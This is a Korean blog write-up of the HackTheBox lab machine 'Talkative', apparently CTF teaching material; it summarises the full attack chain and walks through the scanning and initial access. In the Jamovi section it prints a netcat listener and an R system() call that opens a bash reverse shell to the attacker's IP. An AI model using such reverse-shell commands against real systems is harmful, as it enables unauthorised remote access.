---
title: "Talkative (Hard)"
date: 2025-11-05
layout: single
excerpt: "Talkative는 하드 난이도의 Linux 머신으로, 초기 진입점은 Jamovi 웹 애플리케이션에 존재하는 명령어 삽입(Command Injection) 취약점으로, 이를 이용해 Jamovi가 실행 중인 Docker 컨테이너 내부로 진입할 수 있다. 컨테이너 내부에서는 .omv 파일을 발견할 수 있으며, 이를 압축 해제함으로써 Bolt CMS의 admin 사용자 자격 증명을 확보할 수 있으며, 확보한 계정으로 로그인한 후에는, Twig 템플릿 엔진에 존재하는 SSTI(Server Side Template Injection) 취약점을 이용해 www-data 권한의 셸을 획득할 수 있다. 이후 네트워크를 추가로 탐색하면, 내부 시스템에 존재하는 saul 사용자로 권한을 확장할 수 있다. root 권한을 얻기 위해서는 포트 포워딩을 설정하여, 별도의 컨테이너에서 실행 중인 MongoDB 인스턴스에 접속해야 하며, 이를 통해 RocketChat에 등록된 사용자의 권한을 조작하여 웹 GUI의 관리자 대시보드에 접근할 수 있다. 이후 RocketChat의 웹훅(Webhook) 기능을 추가로 악용함으로써, RocketChat 컨테이너 내부에서 root 셸을 획득할 수 있다. 마지막으로, 컨테이너 내에서 libcap2 패키지를 설치하고 시스템 Capabilities를 조회하면 CAP_DAC_READ_SEARCH 권한이 활성화되어 있음을 확인할 수 있으며, 이를 악용하여 shocker 익스플로잇을 실행하고 호스트의 루트 권한을 탈취할 수 있다"
author_profile: true
toc: true
toc_label: "Talkative"
toc_icon: "book"
toc_sticky: true
header:
  teaser: /assets/htb-linux/talkative/talkative.png
  teaser_home_page: true
categories: [hackthebox linux]
tags: [htb, linux, web, lfi, command-injection, rce, neo4j, priv-esc, cypher-injection, gogs, pip-exploit, sudo, chisel, reverse-shell]
---

![Talkative](/assets/htb-linux/talkative/talkative.png)

**Talkative**는 하드 난이도의 Linux 머신이다.  
초기 진입점은 `Jamovi` 웹 애플리케이션에 존재하는 **명령어 삽입(Command Injection)** 취약점으로, 이를 이용해 `Jamovi`가 실행 중인 **Docker 컨테이너 내부로 진입**할 수 있다. 컨테이너 내부에서는 `.omv` 파일을 발견할 수 있으며, 이를 압축 해제함으로써 `Bolt CMS`의 `admin` 사용자 자격 증명을 확보할 수 있다.

확보한 계정으로 로그인한 후에는, `Twig` 템플릿 엔진에 존재하는 **SSTI(Server Side Template Injection)** 취약점을 이용해 `www-data` 권한의 셸을 획득할 수 있다.

이후 네트워크를 추가로 탐색하면, 내부 시스템에 존재하는 `saul` 사용자로 **권한을 확장**할 수 있다 `root` 권한을 얻기 위해서는 **포트 포워딩을 설정하여**, 별도의 컨테이너에서 실행 중인 `MongoDB` 인스턴스에 접속해야 하며, 이를 통해 `RocketChat`에 등록된 사용자의 권한을 조작하여 웹 GUI의 **관리자 대시보드에 접근**할 수 있다.

이후 `RocketChat`의 **웹훅(Webhook)** 기능을 추가로 악용함으로써, `RocketChat` 컨테이너 내부에서 `root` 셸을 획득할 수 있다.

마지막으로, 컨테이너 내에서 `libcap2` 패키지를 설치하고 **시스템 Capabilities**를 조회하면 `CAP_DAC_READ_SEARCH` 권한이 활성화되어 있음을 확인할 수 있으며, 이를 악용하여 `shocker` 익스플로잇을 실행하고 **호스트의 루트 권한을 탈취**할 수 있다.

# Enumeration

## Portscan

먼저 대상 Host(`10.129.227.113`)에 대해 기본 스크립트와 서비스 버전 탐지를 수행하였다:

```bash
$ nmap -sC -sV 10.129.227.113
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-05 12:05 EST
Nmap scan report for 10.129.227.113
Host is up (0.20s latency).
Not shown: 994 closed tcp ports (reset)
PORT     STATE    SERVICE VERSION
22/tcp   filtered ssh
80/tcp   open     http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Debian)
|_http-title: Did not follow redirect to http://talkative.htb
3000/tcp open     ppp?
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Instance-ID: iRFLaerkikrQB5NcB
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Wed, 05 Nov 2025 17:05:25 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|     <meta name="distribution" content="global" />
|     <meta name="rating" content="general" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta name="apple-mobile-web-app-capable" conten
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Instance-ID: iRFLaerkikrQB5NcB
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Wed, 05 Nov 2025 17:05:27 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|     <meta name="distribution" content="global" />
|     <meta name="rating" content="general" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta name="apple-mobile-web-app-capable" conten
|   Help, NCP: 
|_    HTTP/1.1 400 Bad Request
8080/tcp open     http    Tornado httpd 5.0
|_http-title: jamovi
|_http-server-header: TornadoServer/5.0
8081/tcp open     http    Tornado httpd 5.0
|_http-server-header: TornadoServer/5.0
|_http-title: 404: Not Found
8082/tcp open     http    Tornado httpd 5.0
|_http-server-header: TornadoServer/5.0
|_http-title: 404: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.95%I=7%D=11/5%Time=690B83D4%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,34BC,"HTTP/1\.1\x20200\x20OK\r\nX-XSS-Protection:\x201\r\nX-In
SF:stance-ID:\x20iRFLaerkikrQB5NcB\r\nContent-Type:\x20text/html;\x20chars
SF:et=utf-8\r\nVary:\x20Accept-Encoding\r\nDate:\x20Wed,\x2005\x20Nov\x202
SF:025\x2017:05:25\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html
SF:>\n<html>\n<head>\n\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/c
SF:ss\"\x20class=\"__meteor-css__\"\x20href=\"/3ab95015403368c507c78b4228d
SF:38a494ef33a08\.css\?meteor_css_resource=true\">\n<meta\x20charset=\"utf
SF:-8\"\x20/>\n\t<meta\x20http-equiv=\"content-type\"\x20content=\"text/ht
SF:ml;\x20charset=utf-8\"\x20/>\n\t<meta\x20http-equiv=\"expires\"\x20cont
SF:ent=\"-1\"\x20/>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=
SF:\"IE=edge\"\x20/>\n\t<meta\x20name=\"fragment\"\x20content=\"!\"\x20/>\
SF:n\t<meta\x20name=\"distribution\"\x20content=\"global\"\x20/>\n\t<meta\
SF:x20name=\"rating\"\x20content=\"general\"\x20/>\n\t<meta\x20name=\"view
SF:port\"\x20content=\"width=device-width,\x20initial-scale=1,\x20maximum-
SF:scale=1,\x20user-scalable=no\"\x20/>\n\t<meta\x20name=\"mobile-web-app-
SF:capable\"\x20content=\"yes\"\x20/>\n\t<meta\x20name=\"apple-mobile-web-
SF:app-capable\"\x20conten")%r(Help,1C,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\n\r\n")%r(NCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(HTT
SF:POptions,1518,"HTTP/1\.1\x20200\x20OK\r\nX-XSS-Protection:\x201\r\nX-In
SF:stance-ID:\x20iRFLaerkikrQB5NcB\r\nContent-Type:\x20text/html;\x20chars
SF:et=utf-8\r\nVary:\x20Accept-Encoding\r\nDate:\x20Wed,\x2005\x20Nov\x202
SF:025\x2017:05:27\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html
SF:>\n<html>\n<head>\n\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/c
SF:ss\"\x20class=\"__meteor-css__\"\x20href=\"/3ab95015403368c507c78b4228d
SF:38a494ef33a08\.css\?meteor_css_resource=true\">\n<meta\x20charset=\"utf
SF:-8\"\x20/>\n\t<meta\x20http-equiv=\"content-type\"\x20content=\"text/ht
SF:ml;\x20charset=utf-8\"\x20/>\n\t<meta\x20http-equiv=\"expires\"\x20cont
SF:ent=\"-1\"\x20/>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=
SF:\"IE=edge\"\x20/>\n\t<meta\x20name=\"fragment\"\x20content=\"!\"\x20/>\
SF:n\t<meta\x20name=\"distribution\"\x20content=\"global\"\x20/>\n\t<meta\
SF:x20name=\"rating\"\x20content=\"general\"\x20/>\n\t<meta\x20name=\"view
SF:port\"\x20content=\"width=device-width,\x20initial-scale=1,\x20maximum-
SF:scale=1,\x20user-scalable=no\"\x20/>\n\t<meta\x20name=\"mobile-web-app-
SF:capable\"\x20content=\"yes\"\x20/>\n\t<meta\x20name=\"apple-mobile-web-
SF:app-capable\"\x20conten");
Service Info: Host: 172.17.0.15

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.31 seconds
```

Nmap 스캔 결과, `SSH(22)` 포트는 **filtered** 상태이며, `HTTP(80)` 및 여러 웹 서비스(`3000`, `8080`, `8081`, `8082`) 포트가 열려 있음을 확인했다.

또한, `HTTP(80)` 포트는 `talkative.htb` 도메인으로 리다이렉션되므로, 해당 도메인을 `/etc/hosts` 에 등록해야 정상적인 접근이 가능하다.

## 도메인 이름 설정 (/etc/hosts)

웹 서비스 접근을 위해 `/etc/hosts` 파일에 **10.129.227.113 talkative.htb**를 추가하였다.

```bash
$ cat /etc/hosts | grep htb

10.129.227.113  talkative.htb
```

---

# Vulnerability Analysis

## talkative.htb

`http://talkative.htb` 에 접속하면, Talkative라는 이름의 웹 서비스 소개 페이지가 표시된다.

## TCP 3000 (ROCKET.CHAT)

`TCP 3000`번 포트로 접속하면, `Rocket.Chat` 서비스의 로그인 화면이 나타난다.

![Talkative](/assets/htb-linux/talkative/rocket-chat-login.png)

해당 페이지는 이메일 또는 사용자명과 비밀번호 입력 필드를 포함하고 있으며, 하단에는 비밀번호 재설정 및 계정 생성 링크도 제공된다.
또한 페이지 하단에는 "`Powered by Rocket.Chat`"이라는 문구가 표시되어, 해당 서비스가 오픈소스 채팅 플랫폼인 **Rocket.Chat** 기반임을 확인할 수 있다.

계정을 생성한 뒤 로그인하면, 내부 **Rocket.Chat** 대시보드에 접근할 수 있다.

![Talkative](/assets/htb-linux/talkative/rocket-chat-dashboard.png)

대시보드에서는 `#general` 채널이 존재하며, 이 곳에 사용자들이 참여해 있는 상태이다.

그리고 `Saul Goodman` 이라는 이름의 계정이 `@admin` 사용자명으로 등록되어 있으며, 이 계정은 `Admin` 권한을 가지고 있다.

## TCP 8080 (jamovi)

`TCP 8080` 에서 실행 중인 `Jamovi` 웹 애플리케이션에 접속하면, 위와 같은 **분석 도구 화면**이 표시된다.

![Talkative](/assets/htb-linux/talkative/jamovi.png)

### Jamovi RJ Editor Reverse Shell

상단 메뉴에서 `Analyses` 탭이 존재하며, 이 중 `R` 아이콘을 클릭하면 `Rj Editor` 모듈이 드롭다운 형태로 표시된다.

![Talkative](/assets/htb-linux/talkative/jamovi-rj.png)

여기서 `Rj Editor` 를 선택하면 R 코드를 직접 실행할 수 있는 편집기로 이동할 수 있다.

RJ 편집기에서 R 스크립트를 입력한 후, `Ctrl + Shift + Enter` 단축키를 사용하여 코드를 실행할 수 있다.

![Talkative](/assets/htb-linux/talkative/jamovi-rj-editor.png)

먼저, 로컬 터미널에서 `nc` 명령어로 리버스 셸을 수신 대기한다:

```bash
$ nc -lvnp 9001
```

이후 RJ 편집기 내에 다음과 같이 리버스 셸 명령어를 삽입하였다:

```r
system("bash -c 'bash -i >& /dev/tcp/10.10.14.171/9001 0>&1'", intern=TRUE)
```

해당 스크립트를 실행한 결과, 정상적으로 Docker 컨테이너 내부로 진입하는 데 성공하였다.

![Talkative](/assets/htb-linux/talkative/jamovi-revshell.png)
